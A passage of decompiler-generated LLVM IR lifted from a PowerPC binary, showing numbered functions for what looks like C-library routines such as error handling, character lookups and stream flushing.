  %v0_1000c580 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c580 = inttoptr i32 %v0_1000c57c to i32*
  store i32 %v0_1000c580, i32* %v2_1000c580, align 4
  br label %dec_label_pc_1000c588

dec_label_pc_1000c588:                            ; preds = %dec_label_pc_1000c564, %dec_label_pc_1000c57c
  %v0_1000c598 = phi i32 [ %v0_1000c56c, %dec_label_pc_1000c564 ], [ -1, %dec_label_pc_1000c57c ]
  ret i32 %v0_1000c598

; uselistorder directives
  uselistorder label %dec_label_pc_1000c588, { 1, 0 }
  uselistorder label %dec_label_pc_1000c564, { 1, 0 }
}

define i32 @function_1000c59c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c59c:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000c5a8 = call i32 @function_1000c524(i32 577, i32 577)
  ret i32 %v2_1000c5a8
}

define i32 @function_1000c5ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c5ac:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c5c4 = call i32 @__asm_mfcr()
  %v1_1000c5c8 = and i32 %v0_1000c5c4, 268435456
  %v3_1000c5c8 = icmp eq i32 %v1_1000c5c8, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000c5c4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5c8, label %dec_label_pc_1000c5e0, label %dec_label_pc_1000c5d4

dec_label_pc_1000c5d4:                            ; preds = %dec_label_pc_1000c5ac
  %v0_1000c5d4 = call i32 @function_1000c85c()
  %v0_1000c5d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5d8 = inttoptr i32 %v0_1000c5d4 to i32*
  store i32 %v0_1000c5d8, i32* %v2_1000c5d8, align 4
  br label %dec_label_pc_1000c5e0

dec_label_pc_1000c5e0:                            ; preds = %dec_label_pc_1000c5ac, %dec_label_pc_1000c5d4
  %v0_1000c5f0 = phi i32 [ %v0_1000c5c4, %dec_label_pc_1000c5ac ], [ -1, %dec_label_pc_1000c5d4 ]
  ret i32 %v0_1000c5f0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5e0, { 1, 0 }
}

define i32 @function_1000c5f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000c5f4:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c60c = call i32 @__asm_mfcr()
  %v1_1000c610 = and i32 %v0_1000c60c, 268435456
  %v3_1000c610 = icmp eq i32 %v1_1000c610, 0
  store i32 %v0_1000c60c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c610, label %dec_label_pc_1000c628, label %dec_label_pc_1000c61c

dec_label_pc_1000c61c:                            ; preds = %dec_label_pc_1000c5f4
  %v0_1000c61c = call i32 @function_1000c85c()
  %v0_1000c620 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c620 = inttoptr i32 %v0_1000c61c to i32*
  store i32 %v0_1000c620, i32* %v2_1000c620, align 4
  br label %dec_label_pc_1000c628

dec_label_pc_1000c628:                            ; preds = %dec_label_pc_1000c5f4, %dec_label_pc_1000c61c
  %v0_1000c638 = phi i32 [ %v0_1000c60c, %dec_label_pc_1000c5f4 ], [ -1, %dec_label_pc_1000c61c ]
  ret i32 %v0_1000c638

; uselistorder directives
  uselistorder label %dec_label_pc_1000c628, { 1, 0 }
}

define i32 @function_1000c63c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c63c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c654 = call i32 @__asm_mfcr()
  %v1_1000c658 = and i32 %v0_1000c654, 268435456
  %v3_1000c658 = icmp eq i32 %v1_1000c658, 0
  store i32 %v0_1000c654, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c658, label %dec_label_pc_1000c670, label %dec_label_pc_1000c664

dec_label_pc_1000c664:                            ; preds = %dec_label_pc_1000c63c
  %v0_1000c664 = call i32 @function_1000c85c()
  %v0_1000c668 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c668 = inttoptr i32 %v0_1000c664 to i32*
  store i32 %v0_1000c668, i32* %v2_1000c668, align 4
  br label %dec_label_pc_1000c670

dec_label_pc_1000c670:                            ; preds = %dec_label_pc_1000c63c, %dec_label_pc_1000c664
  %v0_1000c680 = phi i32 [ %v0_1000c654, %dec_label_pc_1000c63c ], [ -1, %dec_label_pc_1000c664 ]
  ret i32 %v0_1000c680

; uselistorder directives
  uselistorder label %dec_label_pc_1000c670, { 1, 0 }
}

define i32 @function_1000c684(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000c684:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c69c = call i32 @__asm_mfcr()
  %v1_1000c6a0 = and i32 %v0_1000c69c, 268435456
  %v3_1000c6a0 = icmp eq i32 %v1_1000c6a0, 0
  store i32 %v0_1000c69c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6a0, label %dec_label_pc_1000c6b8, label %dec_label_pc_1000c6ac

dec_label_pc_1000c6ac:                            ; preds = %dec_label_pc_1000c684
  %v0_1000c6ac = call i32 @function_1000c85c()
  %v0_1000c6b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6b0 = inttoptr i32 %v0_1000c6ac to i32*
  store i32 %v0_1000c6b0, i32* %v2_1000c6b0, align 4
  br label %dec_label_pc_1000c6b8

dec_label_pc_1000c6b8:                            ; preds = %dec_label_pc_1000c684, %dec_label_pc_1000c6ac
  %v0_1000c6c8 = phi i32 [ %v0_1000c69c, %dec_label_pc_1000c684 ], [ -1, %dec_label_pc_1000c6ac ]
  ret i32 %v0_1000c6c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c6b8, { 1, 0 }
}

define i32 @function_1000c6cc() local_unnamed_addr {
dec_label_pc_1000c6cc:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c6e4 = call i32 @__asm_mfcr()
  %v1_1000c6e8 = and i32 %v0_1000c6e4, 268435456
  %v3_1000c6e8 = icmp eq i32 %v1_1000c6e8, 0
  store i32 %v0_1000c6e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6e8, label %dec_label_pc_1000c700, label %dec_label_pc_1000c6f4

dec_label_pc_1000c6f4:                            ; preds = %dec_label_pc_1000c6cc
  %v0_1000c6f4 = call i32 @function_1000c85c()
  %v0_1000c6f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6f8 = inttoptr i32 %v0_1000c6f4 to i32*
  store i32 %v0_1000c6f8, i32* %v2_1000c6f8, align 4
  br label %dec_label_pc_1000c700

dec_label_pc_1000c700:                            ; preds = %dec_label_pc_1000c6cc, %dec_label_pc_1000c6f4
  %v0_1000c710 = phi i32 [ %v0_1000c6e4, %dec_label_pc_1000c6cc ], [ -1, %dec_label_pc_1000c6f4 ]
  ret i32 %v0_1000c710

; uselistorder directives
  uselistorder label %dec_label_pc_1000c700, { 1, 0 }
}

define i32 @function_1000c714(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c714:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000c71c = icmp eq i32 %arg2, 0
  br i1 %v3_1000c71c, label %dec_label_pc_1000c754, label %dec_label_pc_1000c73c

dec_label_pc_1000c73c:                            ; preds = %dec_label_pc_1000c714
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000c754, label %dec_label_pc_1000c744

dec_label_pc_1000c744:                            ; preds = %dec_label_pc_1000c73c
  %v0_1000c744 = call i32 @function_1000c85c()
  %v2_1000c74c = inttoptr i32 %v0_1000c744 to i32*
  store i32 22, i32* %v2_1000c74c, align 4
  %v0_1000c778.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c774

dec_label_pc_1000c754:                            ; preds = %dec_label_pc_1000c73c, %dec_label_pc_1000c714
  %v0_1000c758 = call i32 @__asm_mfcr()
  %v1_1000c75c = and i32 %v0_1000c758, 268435456
  %v3_1000c75c = icmp eq i32 %v1_1000c75c, 0
  store i32 %v0_1000c758, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c75c, label %dec_label_pc_1000c774, label %dec_label_pc_1000c768

dec_label_pc_1000c768:                            ; preds = %dec_label_pc_1000c754
  %v0_1000c768 = call i32 @function_1000c85c()
  %v0_1000c76c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c76c = inttoptr i32 %v0_1000c768 to i32*
  store i32 %v0_1000c76c, i32* %v2_1000c76c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c774

dec_label_pc_1000c774:                            ; preds = %dec_label_pc_1000c754, %dec_label_pc_1000c744, %dec_label_pc_1000c768
  %v0_1000c778 = phi i32 [ %v0_1000c758, %dec_label_pc_1000c754 ], [ %v0_1000c778.pre, %dec_label_pc_1000c744 ], [ -1, %dec_label_pc_1000c768 ]
  ret i32 %v0_1000c778

; uselistorder directives
  uselistorder label %dec_label_pc_1000c774, { 2, 0, 1 }
}

define i32 @function_1000c78c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c78c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c7a4 = call i32 @__asm_mfcr()
  %v1_1000c7a8 = and i32 %v0_1000c7a4, 268435456
  %v3_1000c7a8 = icmp eq i32 %v1_1000c7a8, 0
  store i32 %v0_1000c7a4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c7a8, label %dec_label_pc_1000c7c0, label %dec_label_pc_1000c7b4

dec_label_pc_1000c7b4:                            ; preds = %dec_label_pc_1000c78c
  %v0_1000c7b4 = call i32 @function_1000c85c()
  %v0_1000c7b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c7b8 = inttoptr i32 %v0_1000c7b4 to i32*
  store i32 %v0_1000c7b8, i32* %v2_1000c7b8, align 4
  br label %dec_label_pc_1000c7c0

dec_label_pc_1000c7c0:                            ; preds = %dec_label_pc_1000c78c, %dec_label_pc_1000c7b4
  %v0_1000c7d0 = phi i32 [ %v0_1000c7a4, %dec_label_pc_1000c78c ], [ -1, %dec_label_pc_1000c7b4 ]
  ret i32 %v0_1000c7d0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c7c0, { 1, 0 }
}

define i32 @function_1000c7d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c7d4:
  %v1_1000c7d8 = call i32 @function_100105f4(i32 0)
  ret i32 %v1_1000c7d8
}

define i32 @function_1000c7dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c7dc:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c7f4 = call i32 @__asm_mfcr()
  %v1_1000c7f8 = and i32 %v0_1000c7f4, 268435456
  %v3_1000c7f8 = icmp eq i32 %v1_1000c7f8, 0
  store i32 %v0_1000c7f4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c7f8, label %dec_label_pc_1000c810, label %dec_label_pc_1000c804

dec_label_pc_1000c804:                            ; preds = %dec_label_pc_1000c7dc
  %v0_1000c804 = call i32 @function_1000c85c()
  %v0_1000c808 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c808 = inttoptr i32 %v0_1000c804 to i32*
  store i32 %v0_1000c808, i32* %v2_1000c808, align 4
  br label %dec_label_pc_1000c810

dec_label_pc_1000c810:                            ; preds = %dec_label_pc_1000c7dc, %dec_label_pc_1000c804
  %v0_1000c820 = phi i32 [ %v0_1000c7f4, %dec_label_pc_1000c7dc ], [ -1, %dec_label_pc_1000c804 ]
  ret i32 %v0_1000c820

; uselistorder directives
  uselistorder label %dec_label_pc_1000c810, { 1, 0 }
}

define i32 @function_1000c824(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c824:
  %v1_1000c828 = mul i32 %arg1, 2
  %v3_1000c82c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18240) to i32*), align 4
  %v2_1000c830 = add i32 %v3_1000c82c, %v1_1000c828
  %v3_1000c830 = inttoptr i32 %v2_1000c830 to i16*
  %v4_1000c830 = load i16, i16* %v3_1000c830, align 2
  %v5_1000c830 = zext i16 %v4_1000c830 to i32
  %v1_1000c834 = call i32 @__asm_rlwinm(i32 %v5_1000c830, i32 0, i32 26, i32 26)
  ret i32 %v1_1000c834
}

define i32 @function_1000c83c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c83c:
  %v1_1000c83c = add i32 %arg1, 128
  %v1_1000c840 = mul i32 %arg1, 2
  %v2_1000c844 = icmp ugt i32 %v1_1000c83c, 383
  %v0_1000c848 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000c844, i32 %v0_1000c848)
  %v3_1000c850 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18232) to i32*), align 4
  %v2_1000c854 = add i32 %v1_1000c840, %v3_1000c850
  %v3_1000c854 = inttoptr i32 %v2_1000c854 to i16*
  %v4_1000c854 = load i16, i16* %v3_1000c854, align 2
  %v5_1000c854 = sext i16 %v4_1000c854 to i32
  ret i32 %v5_1000c854
}

define i32 @function_1000c85c() local_unnamed_addr {
dec_label_pc_1000c85c:
  ret i32 ptrtoint (i32* @global_var_1002b958.706 to i32)
}

define i32 @function_1000c868(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_1000c868:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000c888 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c888, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000c8d8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000c8d8, i32* %stack_var_-96, align 4
  store i32 268486884, i32* @lr, align 4
  %v0_1000c8e0 = call i32 @function_1000c8f4()
  ret i32 %v0_1000c8e0
}

define i32 @function_1000c8f4() local_unnamed_addr {
dec_label_pc_1000c8f4:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000c918 = load i32, i32* @r4, align 4
  store i32 %v0_1000c918, i32* @r27, align 4
  %v0_1000c91c = load i32, i32* @r3, align 4
  %v1_1000c91c = sub i32 -1, %v0_1000c91c
  store i32 %v1_1000c91c, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000c91c, i32* %r31.global-to-local, align 4
  %v2_1000c930 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000c930, i32* @r3, align 4
  %v0_1000c934 = load i32, i32* @r5, align 4
  store i32 %v0_1000c934, i32* %r29.global-to-local, align 4
  %v0_1000c938 = load i32, i32* @r6, align 4
  store i32 %v0_1000c938, i32* @r28, align 4
  store i32 268486984, i32* @lr, align 4
  %v0_1000c944 = call i32 @function_1000ca34()
  %v0_1000c948 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000c948 = load i32, i32* @r27, align 4
  %v3_1000c948 = icmp ugt i32 %v0_1000c948, %v1_1000c948
  %v0_1000c94c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000c94c, i32* @r4, align 4
  %v0_1000c950 = load i32, i32* @r28, align 4
  store i32 %v0_1000c950, i32* @r5, align 4
  %v2_1000c954 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c954, i32* @r3, align 4
  br i1 %v3_1000c948, label %dec_label_pc_1000c960, label %dec_label_pc_1000c964

dec_label_pc_1000c960:                            ; preds = %dec_label_pc_1000c8f4
  store i32 %v1_1000c948, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c964

dec_label_pc_1000c964:                            ; preds = %dec_label_pc_1000c8f4, %dec_label_pc_1000c960
  %v1_1000c964 = phi i32 [ %v0_1000c948, %dec_label_pc_1000c8f4 ], [ %v1_1000c948, %dec_label_pc_1000c960 ]
  %v0_1000c964 = load i32, i32* %r31.global-to-local, align 4
  store i32 268487044, i32* @lr, align 4
  %v0_1000c980 = call i32 @function_1000cc54()
  %v0_1000c984 = load i32, i32* @r30, align 4
  %v3_1000c984 = icmp eq i32 %v0_1000c984, 0
  br i1 %v3_1000c984, label %dec_label_pc_1000c9ac, label %dec_label_pc_1000c98c

dec_label_pc_1000c98c:                            ; preds = %dec_label_pc_1000c964
  %v4_1000c998 = icmp eq i32 %v1_1000c964, 0
  %v1_1000c994 = sext i1 %v4_1000c998 to i32
  %v0_1000c9a0.v0_1000c964 = add i32 %v0_1000c964, %v1_1000c994
  %stack_var_-88.0 = inttoptr i32 %v0_1000c9a0.v0_1000c964 to i8*
  %v0_1000c9a8 = load i32, i32* @r26, align 4
  %v1_1000c9a8 = trunc i32 %v0_1000c9a8 to i8
  store i8 %v1_1000c9a8, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000c9ac

dec_label_pc_1000c9ac:                            ; preds = %dec_label_pc_1000c964, %dec_label_pc_1000c98c
  ret i32 %v0_1000c980

; uselistorder directives
  uselistorder i32 %v0_1000c91c, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000c964, { 1, 0 }
}

define i32 @function_1000c9c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c9c0:
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r28, align 4
  %v0_1000c9d4 = call i32 @function_1000c85c()
  store i32 %v0_1000c9d4, i32* @r26, align 4
  %v1_1000c9e0 = inttoptr i32 %v0_1000c9d4 to i32*
  %v2_1000c9e0 = load i32, i32* %v1_1000c9e0, align 4
  store i32 %v2_1000c9e0, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002b5a4.703 to i32), i32* @r27, align 4
  %v3_1000c9e8 = load i16, i16* @global_var_1002b5a4.703, align 2
  %v4_1000c9e8 = zext i16 %v3_1000c9e8 to i32
  store i32 %v4_1000c9e8, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c9f0.707 to i32), i32* @lr, align 4
  %v1_1000c9ec = call i32 @function_1000e460(i32 0)
  %v1_1000c9f0 = sub i32 1, %v1_1000c9ec
  %v1_1000c9f4 = mul i32 %v1_1000c9f0, 256
  %v0_1000c9f8 = load i32, i32* @r29, align 4
  %v2_1000c9f8 = xor i32 %v1_1000c9f4, %v0_1000c9f8
  %v1_1000ca00 = trunc i32 %v2_1000c9f8 to i16
  store i16 %v1_1000ca00, i16* @global_var_1002b5a4.703, align 2
  %v3_1000ca04 = load i16, i16* @global_var_1002b5f4.704, align 2
  %v4_1000ca04 = zext i16 %v3_1000ca04 to i32
  store i32 %v4_1000ca04, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ca0c.708 to i32), i32* @lr, align 4
  %v1_1000ca08 = call i32 @function_1000e460(i32 1)
  %v1_1000ca0c = sub i32 1, %v1_1000ca08
  %v1_1000ca10 = mul i32 %v1_1000ca0c, 256
  %v0_1000ca14 = load i32, i32* @r29, align 4
  %v2_1000ca14 = xor i32 %v1_1000ca10, %v0_1000ca14
  %v1_1000ca18 = trunc i32 %v2_1000ca14 to i16
  store i16 %v1_1000ca18, i16* @global_var_1002b5f4.704, align 2
  %v0_1000ca1c = load i32, i32* @r25, align 4
  %v1_1000ca1c = load i32, i32* @r26, align 4
  %v2_1000ca1c = inttoptr i32 %v1_1000ca1c to i32*
  store i32 %v0_1000ca1c, i32* %v2_1000ca1c, align 4
  ret i32 %v1_1000ca10

; uselistorder directives
  uselistorder i32 %v1_1000ca10, { 1, 0 }
  uselistorder i16* @global_var_1002b5f4.704, { 1, 0 }
}

define i32 @function_1000ca34() local_unnamed_addr {
dec_label_pc_1000ca34:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001945c.709 to i32), i32* @r4, align 4
  %v0_1000ca40 = call i32 @function_1000dcb0()
  ret i32 %v0_1000ca40
}

define i32 @function_1000ca44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ca44:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002b574.710 to i32), i32* @r3, align 4
  store i32 268487264, i32* @lr, align 4
  %v0_1000ca5c = call i32 @function_1000ca34()
  store i32 ptrtoint (i32* @global_var_1002b58c.711 to i32), i32* @r3, align 4
  store i32 268487276, i32* @lr, align 4
  %v0_1000ca68 = call i32 @function_1000ca34()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000cab49 = icmp eq i32 %storemerge6, 0
  %v1_1000cab811 = add i32 %storemerge6, 56
  store i32 %v1_1000cab811, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cab49, label %dec_label_pc_1000cac4, label %dec_label_pc_1000ca78

dec_label_pc_1000ca78:                            ; preds = %dec_label_pc_1000ca44, %dec_label_pc_1000caa4
  %v0_1000ca78 = call i32 @function_10010040()
  %v3_1000ca7c = icmp eq i32 %v0_1000ca78, 0
  %v0_1000ca80 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000ca80, i32* @r3, align 4
  br i1 %v3_1000ca7c, label %dec_label_pc_1000caa4, label %dec_label_pc_1000ca88

dec_label_pc_1000ca88:                            ; preds = %dec_label_pc_1000ca78
  %v0_1000ca88 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ca88 = add i32 %v0_1000ca88, 8
  %v2_1000ca88 = inttoptr i32 %v1_1000ca88 to i32*
  %v3_1000ca88 = load i32, i32* %v2_1000ca88, align 4
  store i32 %v3_1000ca88, i32* %r9.global-to-local, align 4
  %v3_1000ca90 = inttoptr i32 %v0_1000ca88 to i16*
  store i16 48, i16* %v3_1000ca90, align 2
  %v0_1000ca94 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca94 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca94 = add i32 %v1_1000ca94, 20
  %v3_1000ca94 = inttoptr i32 %v2_1000ca94 to i32*
  store i32 %v0_1000ca94, i32* %v3_1000ca94, align 4
  %v0_1000ca98 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca98 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca98 = add i32 %v1_1000ca98, 24
  %v3_1000ca98 = inttoptr i32 %v2_1000ca98 to i32*
  store i32 %v0_1000ca98, i32* %v3_1000ca98, align 4
  %v0_1000ca9c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca9c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca9c = add i32 %v1_1000ca9c, 28
  %v3_1000ca9c = inttoptr i32 %v2_1000ca9c to i32*
  store i32 %v0_1000ca9c, i32* %v3_1000ca9c, align 4
  %v0_1000caa0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000caa0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000caa0 = add i32 %v1_1000caa0, 16
  %v3_1000caa0 = inttoptr i32 %v2_1000caa0 to i32*
  store i32 %v0_1000caa0, i32* %v3_1000caa0, align 4
  br label %dec_label_pc_1000caa4

dec_label_pc_1000caa4:                            ; preds = %dec_label_pc_1000ca78, %dec_label_pc_1000ca88
  %v1_1000caa8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000caa8 = add i32 %v1_1000caa8, 52
  %v3_1000caa8 = inttoptr i32 %v2_1000caa8 to i32*
  store i32 1, i32* %v3_1000caa8, align 4
  store i32 268487344, i32* @lr, align 4
  %v0_1000caac = call i32 @function_1000ca34()
  %v0_1000cab0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cab0 = add i32 %v0_1000cab0, 32
  %v2_1000cab0 = inttoptr i32 %v1_1000cab0 to i32*
  %storemerge = load i32, i32* %v2_1000cab0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000cab4 = icmp eq i32 %storemerge, 0
  %v1_1000cab8 = add i32 %storemerge, 56
  store i32 %v1_1000cab8, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cab4, label %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge, label %dec_label_pc_1000ca78

dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge: ; preds = %dec_label_pc_1000caa4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  br label %dec_label_pc_1000cac4

dec_label_pc_1000cac4:                            ; preds = %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge, %dec_label_pc_1000ca44
  %v0_1000cb0016 = phi i32 [ %v1_1000cab8, %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge ], [ %v1_1000cab811, %dec_label_pc_1000ca44 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge ], [ 0, %dec_label_pc_1000ca44 ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000cae85 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000cae85, label %dec_label_pc_1000caf0, label %dec_label_pc_1000cad0

dec_label_pc_1000cad0:                            ; preds = %dec_label_pc_1000cac4, %dec_label_pc_1000cae4
  %v0_1000cad0 = phi i32 [ %storemerge1, %dec_label_pc_1000cae4 ], [ %storemerge12, %dec_label_pc_1000cac4 ]
  %v1_1000cad0 = inttoptr i32 %v0_1000cad0 to i16*
  %v2_1000cad0 = load i16, i16* %v1_1000cad0, align 2
  %v3_1000cad0 = zext i16 %v2_1000cad0 to i32
  store i32 %v0_1000cad0, i32* @r3, align 4
  %v1_1000cad8 = and i32 %v3_1000cad0, 64
  store i32 %v1_1000cad8, i32* %r9.global-to-local, align 4
  %v3_1000cad8 = icmp eq i32 %v1_1000cad8, 0
  br i1 %v3_1000cad8, label %dec_label_pc_1000cae4, label %dec_label_pc_1000cae0

dec_label_pc_1000cae0:                            ; preds = %dec_label_pc_1000cad0
  store i32 268487396, i32* @lr, align 4
  %v0_1000cae0 = call i32 @function_1000cb04()
  %v0_1000cae4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cae4

dec_label_pc_1000cae4:                            ; preds = %dec_label_pc_1000cad0, %dec_label_pc_1000cae0
  %v0_1000cae4 = phi i32 [ %v0_1000cad0, %dec_label_pc_1000cad0 ], [ %v0_1000cae4.pre, %dec_label_pc_1000cae0 ]
  %v0_1000cb0017 = phi i32 [ %v0_1000cad0, %dec_label_pc_1000cad0 ], [ %v0_1000cae0, %dec_label_pc_1000cae0 ]
  %v1_1000cae4 = add i32 %v0_1000cae4, 32
  %v2_1000cae4 = inttoptr i32 %v1_1000cae4 to i32*
  %storemerge1 = load i32, i32* %v2_1000cae4, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000cae8 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000cae8, label %dec_label_pc_1000caf0, label %dec_label_pc_1000cad0

dec_label_pc_1000caf0:                            ; preds = %dec_label_pc_1000cae4, %dec_label_pc_1000cac4
  %v0_1000cb00 = phi i32 [ %v0_1000cb0016, %dec_label_pc_1000cac4 ], [ %v0_1000cb0017, %dec_label_pc_1000cae4 ]
  ret i32 %v0_1000cb00

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000cad0, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cae4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000caa4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca78, { 1, 0 }
}

define i32 @function_1000cb04() local_unnamed_addr {
dec_label_pc_1000cb04:
  %v0_1000cb0c = load i32, i32* @r31, align 4
  %v0_1000cb10 = load i32, i32* @r3, align 4
  %v1_1000cb18 = add i32 %v0_1000cb10, 8
  %v2_1000cb18 = inttoptr i32 %v1_1000cb18 to i32*
  %v3_1000cb18 = load i32, i32* %v2_1000cb18, align 4
  %v1_1000cb1c = add i32 %v0_1000cb10, 16
  %v2_1000cb1c = inttoptr i32 %v1_1000cb1c to i32*
  %v3_1000cb1c = load i32, i32* %v2_1000cb1c, align 4
  %v2_1000cb24 = sub i32 %v3_1000cb1c, %v3_1000cb18
  store i32 %v2_1000cb24, i32* @r5, align 4
  %v5_1000cb24 = icmp eq i32 %v2_1000cb24, 0
  br i1 %v5_1000cb24, label %dec_label_pc_1000cb34, label %dec_label_pc_1000cb2c

dec_label_pc_1000cb2c:                            ; preds = %dec_label_pc_1000cb04
  store i32 %v3_1000cb18, i32* %v2_1000cb1c, align 4
  store i32 268487476, i32* @lr, align 4
  %v2_1000cb30 = inttoptr i32 %v3_1000cb18 to i16*
